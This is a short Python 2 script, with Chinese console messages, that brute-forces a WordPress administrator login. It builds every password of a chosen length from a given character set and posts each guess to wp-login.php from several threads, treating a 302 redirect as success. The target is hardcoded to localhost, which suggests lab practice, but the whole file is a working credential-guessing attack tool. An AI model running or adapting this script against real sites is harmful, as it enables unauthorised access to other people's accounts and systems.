#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests
import sys
import itertools
import Queue
import threading
import time

class Bruter(object):
	def __init__(self,user,characters,pwd_len,threads):
		self.user = user
		self.found = False
        	self.threads = threads
		print '构建待测试口令队列中...'.decode('utf8')
		self.pwd_queue = Queue.Queue()
		for pwd in list(itertools.product(characters,repeat=pwd_len)):
			self.pwd_queue.put(''.join(pwd))
		self.result = None
		print '构建成功!'.decode('utf8')
	def brute(self):
		for i in range(self.threads):
			t = threading.Thread(target=self.__web_bruter)
			t.start()
			print '破解线程-->%s 启动'.decode('utf8') % t.ident
		while(not self.pwd_queue.empty()):
			sys.stdout.write('\r 进度: 还剩余%s个口令 (每1s刷新)'.decode('utf8') % self.pwd_queue.qsize())
			sys.stdout.flush()
			time.sleep(1)
		print '\n破解完毕'.decode('utf8')
	def __login(self,pwd):
		url = 'http://localhost/wordpress/wp-login.php'
		values = {'log':self.user,'pwd':pwd,'wp-submit':'Log In',
		'redirect_to':'http://localhost/wordpress/wp-admin',
 		'test_cookie':'1'
		}
		my_cookie = {'wordpress_test_cookie':'WP Cookie check'}
		r = requests.post(url,data=values,cookies=my_cookie,allow_redirects=False)
		if r.status_code == 302:
			return True
		return False
	def __web_bruter(self):
		while not self.pwd_queue.empty() and not self.found:
			pwd_test = self.pwd_queue.get()
			if self.__login(pwd_test):
				self.found = True
				self.result = pwd_test
				print '破解 %s 成功，密码为: %s'.decode('utf8') % (self.user,pwd_test)
			else:
				self.found = False

if __name__ == '__main__':
	if len(sys.argv) != 5:
		print '用法 : cmd [用户名] [密码字符] [密码长度] [线程数]'.decode('utf8')
		exit(0)
	b = Bruter(sys.argv[1],sys.argv[2],int(sys.argv[3]),int(sys.argv[4]))
	b.brute()
	print b.result
